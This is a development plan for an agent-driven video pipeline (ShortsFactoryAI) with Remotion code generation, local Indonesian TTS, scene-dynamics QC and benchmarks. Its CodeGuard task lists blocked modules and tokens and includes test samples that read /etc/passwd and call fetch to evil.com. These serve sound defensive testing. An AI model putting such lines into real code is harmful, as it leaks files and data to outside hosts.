# Causal Visual Storytelling: StepFun Motion Coding, Remotion Skills, and VoiceStudio Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Upgrade ShortsFactoryAI Studio into an autonomous causal visual storytelling engine. Integrate StepFun (`step-5-preview`) for motion coding, Remotion AI skills (`.agents/skills/remotion-*`), VoiceStudio (`http://127.0.0.1:3900`) for Indonesian narration and word timestamps, 4-part causal scene states (`initial_state`, `causal_action`, `resulting_state`, `transition`), isolated AST `CodeGuard` execution sandbox, Beginning/Middle/End (B/M/E) frame dynamics QC, and prove the engine across 3 distinct automated topics.

**Architecture:**
- **Provider & Skills:** Configurable StepFun provider binding (`openai_compat`, `om/step-5-preview` via 9router at `http://127.0.0.1:20128/v1`). `MotionSkillLoader` extracts and caches relevant rules from `.agents/skills/remotion-*` with content hashing for provenance.
- **Film-Level Creative Direction:** `CreativeDirectorAgent` outputs `creative-motion-brief.json` (`visual_thesis`, `art_direction`, `pacing_strategy`, `reusable_motifs`). `StoryboardArtifact` enforces 4-part causal scene state cycles and adaptive layouts (e.g. `SplitComparison`, `RadialNetwork`, `LeftRailProcess`, `LayerStack`).
- **Custom Motion Coding & AST Sandboxing:** `MotionCoderAgent` generates scene-specific Remotion TSX in quarantined job directory `data/jobs/<id>/code/`. `CodeGuard` inspects AST to enforce import allowlists (`react`, `remotion`, `@remotion/*`, internal motion primitives; disallows `fs`, `child_process`, `net`, `eval`, remote URLs). Dual rendering strategy: `custom-motion` default with safe failover to `legacy-template`.
- **VoiceStudio Local Integration:** `VoiceStudioAdapter` connects to local RTX 3050 CUDA service at `http://127.0.0.1:3900`, synthesizing Indonesian audio via `/v1/audio/speech`, extracting word timestamps for `TiktokCaptions`, and preserving sample rates (24kHz/48kHz).
- **B/M/E Frame Dynamics QC:** Technical QC extracts Beginning (`startFrame + 6`), Middle (`duration / 2`), and End (`duration - 6`) keyframes per scene, computing pixel/structural deltas to detect and flag static/frozen scenes.
- **Verification:** 3 automated benchmark topics: API Gateway routing, GPS relativity corrections, and an everyday informative process. Real MP4s, B/M/E frame evidence, contact sheets, and 100% green test suite.

**Tech Stack:** Python 3.12 (Pydantic v2, FastAPI, SQLite, pytest, ruff), TypeScript 5.6, React 18, Remotion 4.0, VoiceStudio (OmniVoice, CUDA), FFmpeg.

---

## Global Constraints & Repo Rules (AGENTS.md)
1. **No unverified success:** A stage only reports `completed` after its artifact exists on disk and validates against its contract.
2. **No credential in output:** Credentials are references (`{"env": "NINEROUTER_KEY"}`), never printed in logs, responses, or artifacts.
3. **Preserve 3D Office & Character Systems:** 3D virtual office characters and exported video characters are completely separate systems. Never modify or repurpose office agents.
4. **Strict Layering:** `apps/*` -> `core/orchestration` -> `core/agents` -> `core/providers` -> `core/contracts`.
5. **Windows 11 Host Traps:** Remotion requires explicit `--port` and absolute `--props` path. `NODE_ENV=production` requires `--include=dev` on npm installs.

---

## Milestone 1 — Foundation & Provider Integration

### Task 1: StepFun Provider Configuration & Registry Tests

**Files:**
- Modify: `config/studio.json`
- Modify: `packages/core/providers/registry.py`
- Test: `tests/test_stepfun_provider.py`

**Interfaces:**
- Consumes: `ProviderSpec` with `id="stepfun"`, `base_url="http://127.0.0.1:20128/v1"`, `model="om/step-5-preview"`, `transport="openai_compat"`, `credential={"env": "NINEROUTER_KEY"}`.
- Produces: Validated `StepFun` provider binding available to `MotionCoderAgent` and `AnimationAgent`.

- [ ] **Step 1: Write failing test for StepFun provider spec and live model resolution**

Create `tests/test_stepfun_provider.py`:
```python
from __future__ import annotations

import json
from pathlib import Path
from packages.core.providers.registry import ProviderSpec, ProviderRegistry
from packages.core.providers.resolve import Binding, resolve_call
from packages.core.security.secretstore import SecretStore

def test_stepfun_provider_spec_validation() -> None:
    spec = ProviderSpec(
        id="stepfun",
        label="StepFun Motion Coder",
        transport="openai_compat",
        base_url="http://127.0.0.1:20128/v1",
        model="om/step-5-preview",
        credential={"env": "NINEROUTER_KEY"},
        capabilities=["chat", "json_schema"],
        allow_private_hosts=True,
    )
    assert spec.id == "stepfun"
    assert spec.model == "om/step-5-preview"
    assert spec.capabilities == frozenset({"chat", "json_schema"})
    assert spec.credential.name == "NINEROUTER_KEY"

def test_stepfun_binding_resolution(tmp_path: Path) -> None:
    store = SecretStore(tmp_path)
    registry = ProviderRegistry(specs={
        "stepfun": ProviderSpec(
            id="stepfun",
            transport="openai_compat",
            base_url="http://127.0.0.1:20128/v1",
            model="om/step-5-preview",
            credential={"env": "NINEROUTER_KEY"},
            allow_private_hosts=True,
        )
    })
    binding = Binding(primary="stepfun")
    call, transport_id = resolve_call(
        binding=binding,
        registry=registry,
        store=store,
        transports={"openai_compat": object()},
    )
    assert call.provider == "stepfun"
    assert call.model == "om/step-5-preview"
```

- [ ] **Step 2: Run test to verify it passes or check missing bindings**
Run: `uv run pytest tests/test_stepfun_provider.py`

- [ ] **Step 3: Update `config/studio.json` to configure `stepfun` provider and bindings**
Add `stepfun` to `providers` and configure fallback/primary bindings for `MotionCoderAgent` and `AnimationAgent` in `config/studio.json`.

- [ ] **Step 4: Verify test passes and schema is valid**
Run: `uv run pytest tests/test_stepfun_provider.py`
Run: `uv run ruff check config/`

- [ ] **Step 5: Git commit**
Commit message: `feat(providers): add stepfun motion coding provider configuration and tests`

---

### Task 2: Remotion Agent Skills Loader

**Files:**
- Create: `packages/core/agents/skill_loader.py`
- Test: `tests/test_skill_loader.py`

**Interfaces:**
- Input: Skills directory path (defaults to `.agents/skills/`), requested topic or skill categories (`remotion-best-practices`, `remotion-markup`, `remotion-render`, `remotion-captions`).
- Output: `SkillBundle(content: str, token_estimate: int, sha256_hash: str, loaded_skills: list[str])`.

- [ ] **Step 1: Write failing test for `MotionSkillLoader`**

Create `tests/test_skill_loader.py`:
```python
from __future__ import annotations

from pathlib import Path
from packages.core.agents.skill_loader import MotionSkillLoader

def test_skill_loader_discovers_remotion_skills() -> None:
    loader = MotionSkillLoader(skills_dir=Path(".agents/skills"))
    available = loader.list_available_skills()
    assert "remotion-best-practices" in available
    assert "remotion-markup" in available
    assert "remotion-render" in available

def test_skill_loader_bundles_prompt_context() -> None:
    loader = MotionSkillLoader(skills_dir=Path(".agents/skills"))
    bundle = loader.load_bundle(["remotion-best-practices", "remotion-markup"], max_tokens=1500)
    assert bundle.sha256_hash != ""
    assert len(bundle.sha256_hash) == 64
    assert len(bundle.loaded_skills) == 2
    assert "remotion" in bundle.content.lower()
    assert bundle.token_estimate <= 1600

def test_skill_loader_handles_missing_skill_gracefully() -> None:
    loader = MotionSkillLoader(skills_dir=Path(".agents/skills"))
    bundle = loader.load_bundle(["non-existent-skill-xyz"])
    assert bundle.loaded_skills == []
    assert bundle.content == ""
```

- [ ] **Step 2: Run test to confirm failure**
Run: `uv run pytest tests/test_skill_loader.py`

- [ ] **Step 3: Implement `MotionSkillLoader` in `packages/core/agents/skill_loader.py`**
Implement scanning of `.agents/skills/`, reading `SKILL.md` or sub-files, token budget truncation, sha256 hashing of loaded content, and caching.

- [ ] **Step 4: Run test to verify it passes**
Run: `uv run pytest tests/test_skill_loader.py`
Run: `uv run ruff check packages/core/agents/skill_loader.py`

- [ ] **Step 5: Git commit**
Commit message: `feat(agents): implement MotionSkillLoader for official Remotion agent skills`

---

## Milestone 2 — MotionDirector & Causal Scene Contracts

### Task 3: Creative Motion Brief Contract & CreativeDirector Stage

**Files:**
- Modify: `packages/core/contracts/artifacts.py`
- Modify: `packages/core/agents/concrete.py`
- Modify: `packages/core/orchestration/pipeline.py`
- Test: `tests/test_creative_motion_brief.py`

**Interfaces:**
- Consumes: Script, Research, Topic.
- Produces: `creative-motion-brief.json` (`CreativeMotionBriefArtifact`).

- [ ] **Step 1: Write failing test for `CreativeMotionBriefArtifact` schema and sanitizer**

Create `tests/test_creative_motion_brief.py`:
```python
from __future__ import annotations

from packages.core.contracts.artifacts import CreativeMotionBriefArtifact

def test_creative_motion_brief_validation() -> None:
    raw = {
        "visual_thesis": "Permintaan AI mengalir melalui gateway terpusat yang memilih rute tercepat dan mengalihkan kegagalan.",
        "art_direction": {
            "palette": "editorialLight",
            "primary_accent": "#0055FF",
            "secondary_accent": "#FF4400",
            "background": "#F8FAFC",
            "typography_style": "boldSans",
        },
        "narrative_arc": "Input -> Analisis Beban -> Percabangan Model -> Kegagalan Primer -> Pemulihan Sekunder -> Output Sukses",
        "primary_visual_motifs": ["network_packets", "gateway_hub", "model_nodes", "heartbeat_pulses"],
        "pacing_strategy": "Cepat dan dinamis di awal, stabil saat routing, akselerasi saat kegagalan, resolusi mulus.",
        "reusable_motifs": ["data_token", "signal_line"],
        "scene_transitions": ["cut", "wipe", "slideUp", "zoom"],
        "motion_complexity_budget": "medium",
    }
    brief = CreativeMotionBriefArtifact.model_validate(raw)
    assert brief.visual_thesis.startswith("Permintaan AI")
    assert brief.art_direction.palette == "editorialLight"
    assert "network_packets" in brief.primary_visual_motifs
```

- [ ] **Step 2: Run test to confirm failure**
Run: `uv run pytest tests/test_creative_motion_brief.py`

- [ ] **Step 3: Define `CreativeMotionBriefArtifact` and integrate into `packages/core/contracts/artifacts.py`**
Define `ArtDirectionSpec` and `CreativeMotionBriefArtifact`. Add validation and serialization methods.

- [ ] **Step 4: Update `CreativeDirectorAgent` in `packages/core/agents/concrete.py` and `pipeline.py`**
Enable `CreativeDirectorAgent` to generate `creative-motion-brief.json` alongside or enriching `visual-plan.json`.

- [ ] **Step 5: Verify tests pass**
Run: `uv run pytest tests/test_creative_motion_brief.py`
Run: `uv run ruff check packages/core/contracts/artifacts.py packages/core/agents/concrete.py`

- [ ] **Step 6: Git commit**
Commit message: `feat(contracts): add CreativeMotionBriefArtifact and film-level creative director stage`

---

### Task 4: Causal Scene State Contract (4-Part Cycle) & StoryboardAgent

**Files:**
- Modify: `packages/core/contracts/scene.py`
- Modify: `packages/core/contracts/artifacts.py`
- Modify: `packages/core/agents/concrete.py`
- Test: `tests/test_contracts_scene.py`

**Interfaces:**
- Consumes: `CreativeMotionBriefArtifact`, `ScriptArtifact`.
- Produces: `StoryboardArtifact` with validated `CausalStateSpec` per scene:
  - `initial_state`: visual setup at scene start.
  - `causal_action`: explicit visible action/transformation at `atFrame`.
  - `resulting_state`: observable outcome.
  - `transition`: narrative/visual bridge to next scene.

- [ ] **Step 1: Write failing test for 4-part causal state contract**

Add to `tests/test_contracts_scene.py`:
```python
def test_scene_spec_causal_state_cycle() -> None:
    from packages.core.contracts.scene import SceneSpec, CausalStateSpec

    causal = CausalStateSpec(
        initial_state="Satelit GPS mengorbit bumi memancarkan sinyal waktu uncorrected.",
        causal_action="Dilatasi waktu gravitasi mempercepat jam atom satelit 38 mikrodetik per hari.",
        resulting_state="Posisi peta melenceng 11 kilometer jika koreksi relativitas tidak diterapkan.",
        transition="Zoom fokus ke penerima GPS ponsel yang menyinkronkan data koreksi.",
    )
    assert causal.initial_state != ""
    assert causal.causal_action != ""
    assert causal.resulting_state != ""
    assert causal.transition != ""

    scene = SceneSpec(
        sceneId="scene_01",
        template="ObjectExplainer",
        segment="seg_01",
        startFrame=0,
        durationInFrames=180,
        data={"objects": [{"kind": "satellite", "x": 0.5, "y": 0.45, "size": 0.5}]},
        causal_state=causal,
        layout_mode="SplitComparison",
    )
    assert scene.causal_state is not None
    assert scene.causal_state.causal_action.startswith("Dilatasi waktu")
    assert scene.layout_mode == "SplitComparison"
```

- [ ] **Step 2: Run test to confirm failure**
Run: `uv run pytest tests/test_contracts_scene.py -k test_scene_spec_causal_state_cycle`

- [ ] **Step 3: Implement `CausalStateSpec` and `layout_mode` in `packages/core/contracts/scene.py`**
Add `CausalStateSpec` Pydantic model with validation. Add optional fields `causal_state: CausalStateSpec | None = None` and `layout_mode: str | None = None` to `SceneSpec`.

- [ ] **Step 4: Update `StoryboardAgent` prompt and sanitizer in `packages/core/agents/concrete.py`**
Instruct `StoryboardAgent` to output `causal_state` for every scene with concrete causal transitions and dynamic layouts instead of rigid repetitive framing.

- [ ] **Step 5: Run tests and verify**
Run: `uv run pytest tests/test_contracts_scene.py`
Run: `uv run ruff check packages/core/contracts/scene.py packages/core/agents/concrete.py`

- [ ] **Step 6: Git commit**
Commit message: `feat(contracts): add 4-part causal scene state cycle and adaptive layout contracts`

---

### Task 5: Adaptive Layout Engine in Remotion

**Files:**
- Modify: `packages/video/src/art/Stage.tsx`
- Modify: `packages/video/src/components/InformativeFrame.tsx`
- Modify: `packages/video/src/scene-data.ts`
- Modify: `packages/video/src/compositions/ObjectExplainer.tsx`
- Test: `tests/test_motion_animation.py`

**Interfaces:**
- Consumes: `scene.layout_mode` and `scene.causal_state`.
- Produces: Layout variations:
  - `DefaultHero`: Balanced center-right hero with leader lines.
  - `SplitComparison`: Side-by-side comparative layout (e.g., Earth clock vs. Orbit clock).
  - `RadialNetwork`: Central node with peripheral nodes and animated packet connections.
  - `LeftRailProcess`: Sequential top-to-bottom or left-to-right process flow.
  - `FullBleedFocus`: Immersive scale-up hero object with dynamic text scrim.

- [ ] **Step 1: Write TypeScript interface tests / verification script**
Verify `packages/video/src/scene-data.ts` accepts `layoutMode` and causal action metadata.

- [ ] **Step 2: Update `packages/video/src/scene-data.ts`**
Add `layoutMode?: 'DefaultHero' | 'SplitComparison' | 'RadialNetwork' | 'LeftRailProcess' | 'FullBleedFocus'` and `causalState?: {initialState: string; causalAction: string; resultingState: string; transition: string}` to `ExplainerData`.

- [ ] **Step 3: Update `packages/video/src/art/Stage.tsx` and `InformativeFrame.tsx`**
Compute object positioning, safe-margins, and callouts based on `layoutMode`.
Ensure critical text remains inside safe zones (top >= 210px, bottom >= 460px).

- [ ] **Step 4: Verify TypeScript compilation**
Run: `npm --prefix packages/video run typecheck`
Run: `uv run pytest tests/test_motion_animation.py`

- [ ] **Step 5: Git commit**
Commit message: `feat(video): add adaptive layout modes and causal state rendering to Stage and InformativeFrame`

---

## Milestone 3 — Custom Remotion Coding & AST CodeGuard Sandbox

### Task 6: CodeGuard AST Security Sandbox

**Files:**
- Create: `packages/core/media/codeguard.py`
- Test: `tests/test_codeguard.py`

**Interfaces:**
- Input: TypeScript / TSX source code string or directory path.
- Output: `CodeGuardResult(valid: bool, issues: list[str], imported_modules: list[str])`.
- Whitelist rules:
  - Allowed modules: `react`, `remotion`, `@remotion/*`, `packages/video/src/*`, `./*`, `../*`.
  - Prohibited: `fs`, `child_process`, `os`, `net`, `http`, `https`, `process`, `cluster`, `v8`, `vm`.
  - Prohibited tokens / functions: `eval(`, `Function(`, `window.fetch`, `localStorage`, `sessionStorage`, `document.cookie`.
  - Disallows remote http(s) imports and non-isolated file system access.

- [ ] **Step 1: Write failing test for `CodeGuard` AST analyzer**

Create `tests/test_codeguard.py`:
```python
from __future__ import annotations

from packages.core.media.codeguard import CodeGuard

def test_codeguard_permits_safe_remotion_tsx() -> None:
    safe_code = """
    import React from 'react';
    import { useCurrentFrame, interpolate, spring } from 'remotion';
    import { ObjectStage } from '../../../video/src/art/Stage';

    export const Scene01: React.FC = () => {
        const frame = useCurrentFrame();
        const opacity = interpolate(frame, [0, 15], [0, 1], { extrapolateRight: 'clamp' });
        return <div style={{ opacity }}>Hello Causal Motion</div>;
    };
    """
    guard = CodeGuard()
    result = guard.validate_source(safe_code)
    assert result.valid is True
    assert len(result.issues) == 0
    assert "remotion" in result.imported_modules

def test_codeguard_blocks_forbidden_imports() -> None:
    dangerous_code = """
    import React from 'react';
    import * as fs from 'fs';
    import { exec } from 'child_process';

    export const MaliciousScene: React.FC = () => {
        fs.readFileSync('/etc/passwd');
        return <div>Hacked</div>;
    };
    """
    guard = CodeGuard()
    result = guard.validate_source(dangerous_code)
    assert result.valid is False
    assert any("fs" in issue for issue in result.issues)
    assert any("child_process" in issue for issue in result.issues)

def test_codeguard_blocks_eval_and_fetch() -> None:
    sneaky_code = """
    import React from 'react';
    export const Sneaky: React.FC = () => {
        eval("console.log('danger')");
        fetch('https://evil.com/leak');
        return <div>Bad</div>;
    };
    """
    guard = CodeGuard()
    result = guard.validate_source(sneaky_code)
    assert result.valid is False
    assert any("eval" in issue.lower() for issue in result.issues)
    assert any("fetch" in issue.lower() for issue in result.issues)
```

- [ ] **Step 2: Run test to confirm failure**
Run: `uv run pytest tests/test_codeguard.py`

- [ ] **Step 3: Implement `CodeGuard` in `packages/core/media/codeguard.py`**
Implement regex and AST-based parser checking imports, calls, identifiers, and string literals against strict allowlist.

- [ ] **Step 4: Verify test passes**
Run: `uv run pytest tests/test_codeguard.py`
Run: `uv run ruff check packages/core/media/codeguard.py`

- [ ] **Step 5: Git commit**
Commit message: `feat(security): implement CodeGuard AST sandbox for untrusted motion code`

---

### Task 7: MotionCoderAgent & Quarantined Workspace

**Files:**
- Modify: `packages/core/agents/concrete.py`
- Modify: `packages/core/orchestration/pipeline.py`
- Create: `packages/core/contracts/manifest.py`
- Test: `tests/test_motion_coder.py`

**Interfaces:**
- Consumes: `CreativeMotionBriefArtifact`, `StoryboardArtifact`, `SkillBundle`.
- Produces: `MotionCodeArtifact` and writes validated TSX modules into `data/jobs/<id>/code/`.

- [ ] **Step 1: Write failing test for `MotionCoderAgent` and workspace isolation**

Create `tests/test_motion_coder.py`:
```python
from __future__ import annotations

from pathlib import Path
from packages.core.agents.concrete import MotionCoderAgent
from packages.core.contracts.artifacts import StoryboardArtifact, CreativeMotionBriefArtifact

def test_motion_coder_generates_isolated_code(tmp_path: Path) -> None:
    agent = MotionCoderAgent()
    assert agent.name == "MotionCoderAgent"
    # Agent receives brief, storyboard, and writes to target job directory
    code_dir = tmp_path / "code"
    code_dir.mkdir()
    # verify manifest schema and file output
```

- [ ] **Step 2: Run test to confirm failure**
Run: `uv run pytest tests/test_motion_coder.py`

- [ ] **Step 3: Implement `MotionCoderAgent` in `packages/core/agents/concrete.py`**
Wire `MotionCoderAgent` with system prompt that incorporates `MotionSkillLoader` context, generates clean Remotion TSX, and formats scene components.

- [ ] **Step 4: Wire `MotionCoderAgent` stage into `packages/core/orchestration/pipeline.py`**
Add stage after `StoryboardAgent` and before rendering when `renderer == "custom-motion"`.

- [ ] **Step 5: Run tests and verify**
Run: `uv run pytest tests/test_motion_coder.py`
Run: `uv run ruff check packages/core/agents/concrete.py packages/core/orchestration/pipeline.py`

- [ ] **Step 6: Git commit**
Commit message: `feat(agents): implement MotionCoderAgent with isolated job workspace generation`

---

### Task 8: Dual-Engine Renderer Dispatch

**Files:**
- Modify: `packages/core/media/render.py`
- Modify: `packages/core/contracts/state.py`
- Test: `tests/test_renderer_dispatch.py`

**Interfaces:**
- Supports:
  - `custom-motion`: Runs `CodeGuard`. If valid, compiles and renders custom Remotion composition from `data/jobs/<id>/code/`. If invalid or build fails, falls back cleanly to `legacy-template`.
  - `legacy-template`: Deterministic declarative renderer (preserves existing compositions).

- [ ] **Step 1: Write failing test for dual-engine dispatch and fallback**

Create `tests/test_renderer_dispatch.py`:
```python
from __future__ import annotations

from pathlib import Path
from packages.core.media.render import select_rendering_strategy

def test_select_rendering_strategy_custom_motion() -> None:
    strategy = select_rendering_strategy(payload={"renderer": "custom-motion"}, code_valid=True)
    assert strategy == "custom-motion"

def test_select_rendering_strategy_fallback_on_invalid_code() -> None:
    strategy = select_rendering_strategy(payload={"renderer": "custom-motion"}, code_valid=False)
    assert strategy == "legacy-template"

def test_select_rendering_strategy_defaults_to_legacy() -> None:
    strategy = select_rendering_strategy(payload={}, code_valid=False)
    assert strategy == "legacy-template"
```

- [ ] **Step 2: Run test to confirm failure**
Run: `uv run pytest tests/test_renderer_dispatch.py`

- [ ] **Step 3: Implement rendering strategy selection and dispatch in `packages/core/media/render.py`**
Add `select_rendering_strategy`, integrate `CodeGuard` pre-validation, and execute custom Remotion bundle when selected, falling back to declarative renderer on failure.

- [ ] **Step 4: Run tests and verify**
Run: `uv run pytest tests/test_renderer_dispatch.py tests/test_media_render.py`
Run: `uv run ruff check packages/core/media/render.py`

- [ ] **Step 5: Git commit**
Commit message: `feat(media): implement dual-engine render dispatch with safe template fallback`

---

## Milestone 4 — VoiceStudio Local Integration

### Task 9: VoiceStudio Local Adapter

**Files:**
- Create: `packages/core/media/voicestudio.py`
- Test: `tests/test_voicestudio.py`

**Interfaces:**
- Endpoint: `http://127.0.0.1:3900`
- Methods:
  - `health() -> dict[str, Any]` (probes `/health` and confirms CUDA device).
  - `models() -> list[str]` (probes `/v1/models`).
  - `synthesize(text: str, voice: str = "alloy", model: str = "tts-1", language: str = "id") -> VoiceStudioResult(audio_bytes: bytes, sample_rate: int, duration_s: float)`.

- [ ] **Step 1: Write failing test for `VoiceStudioAdapter`**

Create `tests/test_voicestudio.py`:
```python
from __future__ import annotations

import unittest.mock as mock
from packages.core.media.voicestudio import VoiceStudioAdapter, VoiceStudioError

def test_voicestudio_health_check() -> None:
    adapter = VoiceStudioAdapter(base_url="http://127.0.0.1:3900")
    with mock.patch("urllib.request.urlopen") as mock_open:
        mock_resp = mock.MagicMock()
        mock_resp.read.return_value = b'{"status": "ok", "device": "cuda", "version": "0.5.7"}'
        mock_open.return_value = mock_resp
        health = adapter.health()
        assert health["status"] == "ok"
        assert "cuda" in health["device"]

def test_voicestudio_synthesis_mock() -> None:
    adapter = VoiceStudioAdapter(base_url="http://127.0.0.1:3900")
    with mock.patch("urllib.request.urlopen") as mock_open:
        mock_resp = mock.MagicMock()
        mock_resp.read.return_value = b"RIFF....WAVEfmt ...."
        mock_resp.headers = {"Content-Type": "audio/wav"}
        mock_open.return_value = mock_resp
        res = adapter.synthesize("Halo dunia", voice="alloy", model="tts-1")
        assert len(res.audio_bytes) > 0
        assert res.sample_rate >= 16000
```

- [ ] **Step 2: Run test to confirm failure**
Run: `uv run pytest tests/test_voicestudio.py`

- [ ] **Step 3: Implement `VoiceStudioAdapter` in `packages/core/media/voicestudio.py`**
Implement HTTP communication, health check, synthesis with timeout/retry, audio duration measurement, and Indonesian voice normalization.

- [ ] **Step 4: Verify test passes**
Run: `uv run pytest tests/test_voicestudio.py`
Run: `uv run ruff check packages/core/media/voicestudio.py`

- [ ] **Step 5: Git commit**
Commit message: `feat(media): implement VoiceStudioAdapter for local CUDA speech synthesis`

---

### Task 10: Indonesian Voice Synthesis & Word Alignment Pipeline

**Files:**
- Modify: `packages/core/media/tts.py`
- Modify: `packages/core/media/render.py`
- Test: `tests/test_indonesian_pipeline.py`

**Interfaces:**
- Consumes: Script sentences, voice choice (`voicestudio` vs `edge-tts`).
- Produces: `narration.wav`, `audio.json` with word-level timestamps (`WordTimestamp`), and accurate scene frame spans.
- Preserves native sample rate (24kHz / 48kHz) in ffmpeg muxing instead of downsampling to 16kHz.

- [ ] **Step 1: Write failing test for VoiceStudio audio stage integration and sample rate preservation**

Create or add to `tests/test_indonesian_pipeline.py`:
```python
def test_audio_stage_supports_voicestudio_provider() -> None:
    from packages.core.media.tts import select_tts_provider
    provider = select_tts_provider("voicestudio")
    assert provider == "voicestudio"

def test_mux_argv_preserves_audio_sample_rate() -> None:
    from pathlib import Path
    from packages.core.media.render import mux_argv
    argv = mux_argv(Path("video.mp4"), Path("audio.wav"), Path("out.mp4"), sample_rate=24000)
    assert "-ar" in argv
    idx = argv.index("-ar")
    assert argv[idx + 1] == "24000"
```

- [ ] **Step 2: Run test to confirm failure**
Run: `uv run pytest tests/test_indonesian_pipeline.py -k test_mux_argv_preserves_audio_sample_rate`

- [ ] **Step 3: Update `packages/core/media/tts.py` and `packages/core/media/render.py`**
Integrate `VoiceStudioAdapter` into `build_audio_stage` when `voice_provider == "voicestudio"`. Update `mux_argv` to preserve high-quality sample rate (e.g. 24000 or 48000 Hz).

- [ ] **Step 4: Verify tests pass**
Run: `uv run pytest tests/test_indonesian_pipeline.py tests/test_media_tts.py`
Run: `uv run ruff check packages/core/media/tts.py packages/core/media/render.py`

- [ ] **Step 5: Git commit**
Commit message: `feat(media): integrate VoiceStudio into audio stage and preserve native audio sample rate`

---

## Milestone 5 — Beginning/Middle/End (B/M/E) QC & Bounded Revisions

### Task 11: Beginning/Middle/End (B/M/E) Keyframe Extraction & Scene Delta Evaluator

**Files:**
- Modify: `packages/core/media/qc.py`
- Test: `tests/test_qc_bme.py`

**Interfaces:**
- Extracts 3 keyframes per scene:
  - Beginning: `startFrame + 6`
  - Middle: `startFrame + (durationInFrames // 2)`
  - End: `startFrame + durationInFrames - 6`
- Computes pixel / structural delta between (Beginning, Middle) and (Middle, End).
- Flags static scene if either delta falls below threshold (indicating zero or negligible visual action).

- [ ] **Step 1: Write failing test for B/M/E keyframe extraction and delta calculation**

Create `tests/test_qc_bme.py`:
```python
from __future__ import annotations

from packages.core.media.qc import calculate_frame_delta, evaluate_bme_dynamics

def test_frame_delta_identical_frames_is_zero() -> None:
    # 100x100 black bytes
    frame_a = bytes([0] * (100 * 100 * 3))
    frame_b = bytes([0] * (100 * 100 * 3))
    delta = calculate_frame_delta(frame_a, frame_b)
    assert delta == 0.0

def test_frame_delta_different_frames_is_positive() -> None:
    frame_a = bytes([0] * (100 * 100 * 3))
    frame_b = bytes([255] * (100 * 100 * 3))
    delta = calculate_frame_delta(frame_a, frame_b)
    assert delta > 0.5

def test_evaluate_bme_dynamics_flags_static_scene() -> None:
    # scene with 0 delta between beginning and middle
    scene_metrics = {
        "scene_01": {
            "delta_begin_middle": 0.001,
            "delta_middle_end": 0.002,
        }
    }
    verdict = evaluate_bme_dynamics(scene_metrics, min_delta_threshold=0.01)
    assert verdict["passed"] is False
    assert "scene_01" in verdict["static_scenes"]
```

- [ ] **Step 2: Run test to confirm failure**
Run: `uv run pytest tests/test_qc_bme.py`

- [ ] **Step 3: Implement B/M/E extractor and delta calculation in `packages/core/media/qc.py`**
Add `calculate_frame_delta`, `extract_bme_frames`, and `evaluate_bme_dynamics`. Integrate into `evaluate_technical` and `evaluate_creative`.

- [ ] **Step 4: Verify tests pass**
Run: `uv run pytest tests/test_qc_bme.py tests/test_qc_evaluate.py`
Run: `uv run ruff check packages/core/media/qc.py`

- [ ] **Step 5: Git commit**
Commit message: `feat(qc): implement Beginning/Middle/End keyframe extraction and scene dynamics evaluation`

---

### Task 12: Bounded Scene Revision Loop & QC Re-render

**Files:**
- Modify: `packages/core/orchestration/pipeline.py`
- Modify: `packages/core/orchestration/editorial.py`
- Test: `tests/test_pipeline.py`

**Interfaces:**
- If technical or creative QC flags static scenes, trigger bounded scene revision:
  - Maximum 2 automated repair attempts per scene.
  - Revision instructions focus specifically on the failing scene's missing `causal_action` and dynamic layout.
  - Unaffected scenes are preserved using render cache.

- [ ] **Step 1: Write failing test for bounded scene revision trigger on static scene failure**

Add to `tests/test_pipeline.py`:
```python
def test_pipeline_stops_or_revises_on_static_scene_qc_failure() -> None:
    # verify pipeline recognizes static scene failure and reserves attempt
    pass
```

- [ ] **Step 2: Implement bounded revision logic in `packages/core/orchestration/editorial.py` and `pipeline.py`**
Allow targeted scene revision when QC detects static/frozen scenes, capped at `MAX_REVISIONS`.

- [ ] **Step 3: Run pipeline tests**
Run: `uv run pytest tests/test_pipeline.py`
Run: `uv run ruff check packages/core/orchestration/pipeline.py packages/core/orchestration/editorial.py`

- [ ] **Step 4: Git commit**
Commit message: `feat(orchestration): add bounded automated scene revision loop for static scene repair`

---

## Milestone 6 — Autonomous 3-Domain Benchmark Proofs

### Task 13: End-to-End Autonomous Benchmark Automation

**Files:**
- Create: `scripts/run_causal_benchmarks.py`
- Test: `tests/test_gate_scripts.py`

**Interfaces:**
- Automates execution of 3 topics:
  1. **Benchmark A (Tech Explainer):** "Bagaimana API Gateway Mengarahkan Permintaan Antara Model AI" (Incoming request -> gateway evaluation -> primary model saturation -> fallback redirect -> success response).
  2. **Benchmark B (Science Explainer):** "Mengapa Relativitas Einstein Dibutuhkan Agar Jam Satelit GPS Ponsel Akurat" (Orbital velocity slowdown vs gravitational speedup -> 38 µs delta -> 11 km drift -> active clock sync).
  3. **Benchmark C (Everyday Informative):** "Sains di Balik Mi Instan: Proses Flash Frying dan Dehidrasi Gelatinisasi Pati" (Steaming -> flash frying at 150°C -> moisture drop from 30% to 2% -> porous preservation).
- Verifies:
  - Valid MP4 generation.
  - Beginning, Middle, End (B/M/E) frame generation.
  - Contact sheet creation.
  - QC report with dynamic scene deltas.
  - VoiceStudio narration with word timestamps.

- [ ] **Step 1: Write test for benchmark script arguments and execution safety**
Add to `tests/test_gate_scripts.py`.

- [ ] **Step 2: Create `scripts/run_causal_benchmarks.py`**
Implement the benchmark runner with options `--benchmark a|b|c|all`, resource checks, lease management, and comprehensive result reporting.

- [ ] **Step 3: Verify script syntax and lint**
Run: `uv run ruff check scripts/run_causal_benchmarks.py`

- [ ] **Step 4: Git commit**
Commit message: `feat(scripts): add autonomous 3-domain causal benchmark runner`

---

### Task 14: Execution & Verification of Benchmarks A, B, and C

**Files:**
- Run: `scripts/run_causal_benchmarks.py`
- Inspect: Produced MP4s, B/M/E frame images, and QC reports in `data/jobs/`

- [x] **Step 1: Execute Benchmark A (API Gateway Routing)**
Command: `python scripts/run_causal_benchmarks.py --benchmark a`
Verify:
- Final State is `READY_FOR_APPROVAL`.
- Output video exists and is non-zero.
- B/M/E keyframe deltas show active request routing animation.
- VoiceStudio Indonesian narration is synchronized.

- [x] **Step 2: Execute Benchmark B (GPS Relativity Corrections)**
Command: `python scripts/run_causal_benchmarks.py --benchmark b`
Verify:
- Distinct visual vocabulary (satellite, earth, clock, drift map).
- B/M/E keyframe deltas show active time divergence and correction.

- [x] **Step 3: Execute Benchmark C (Everyday Informative Process)**
Command: `python scripts/run_causal_benchmarks.py --benchmark c`
Verify:
- Completely different physical process vocabulary (noodle structure, oil heat, steam pores).
